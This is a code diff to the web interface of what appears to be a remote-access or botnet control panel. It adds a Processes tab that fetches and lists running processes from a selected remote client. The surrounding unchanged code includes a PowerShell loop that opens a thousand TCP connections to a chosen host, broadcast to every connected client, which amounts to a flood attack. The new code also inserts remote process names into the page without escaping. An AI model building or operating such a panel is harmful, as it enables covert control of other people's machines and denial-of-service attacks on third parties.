@@ -135,6 +135,7 @@
             <button class="tab-btn active" onclick="switchTab('tab-terminal')">Console</button>
             <button class="tab-btn" onclick="switchTab('tab-files')">Files</button>
             <button class="tab-btn" onclick="switchTab('tab-tools')">Tools</button>
+            <button class="tab-btn" onclick="switchTab('tab-processes')">Processes</button>
             <button class="tab-btn" onclick="switchTab('tab-identity')">Identity</button>
         </div>
 
@@ -192,6 +193,28 @@
                         <button class="btn-primary" onclick="addMacro()">Save Macro</button>
                     </div>
                     <div id="macro-container" class="btn-group"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- PROCESSES -->
+        <div id="tab-processes" class="content-area">
+            <div class="file-browser">
+                <div class="file-header">
+                    <div style="font-family: 'JetBrains Mono'; font-size: 0.8rem; color: var(--accent);">Running Processes</div>
+                    <button class="btn-primary" onclick="requestProcesses()" style="font-size: 0.7rem;">Refresh Processes</button>
+                </div>
+                <div style="max-height: 600px; overflow-y: auto;">
+                    <table style="width: 100%; border-collapse: collapse; font-family: 'JetBrains Mono'; font-size: 0.85rem; color: #fff;">
+                        <thead>
+                            <tr style="border-bottom: 1px solid var(--border); color: var(--text-muted); text-align: left;">
+                                <th style="padding: 10px;">Name</th>
+                                <th style="padding: 10px;">PID</th>
+                                <th style="padding: 10px;">Mem</th>
+                            </tr>
+                        </thead>
+                        <tbody id="process-list-body"></tbody>
+                    </table>
                 </div>
             </div>
         </div>
@@ -423,6 +446,24 @@
         const cmd = `powershell -Command "1..1000 | ForEach { $t = New-Object Net.Sockets.TcpClient; try { $t.Connect('${host}', ${port}); $t.Close() } catch {} }"`;
         allConnectedClients.forEach(c => { if(c.online) socket.emit('command', { command: cmd, client_id: c.id }); });
     }
+
+    function requestProcesses() {
+        if (!current_client_id) return;
+        socket.emit('system_command', { command: '#ps', client_id: current_client_id });
+    }
+
+    socket.on('process_list', (data) => {
+        if (data.client_id === current_client_id) {
+            const body = document.getElementById('process-list-body');
+            body.innerHTML = '';
+            data.processes.forEach(p => {
+                const tr = document.createElement('tr');
+                tr.style.borderBottom = '1px solid var(--border)';
+                tr.innerHTML = `<td style="padding: 10px;">${p.name}</td><td style="padding: 10px;">${p.pid}</td><td style="padding: 10px;">${p.mem}</td>`;
+                body.appendChild(tr);
+            });
+        }
+    });
 
     function addMacro() {
         const name = document.getElementById('new-macro-name').value;
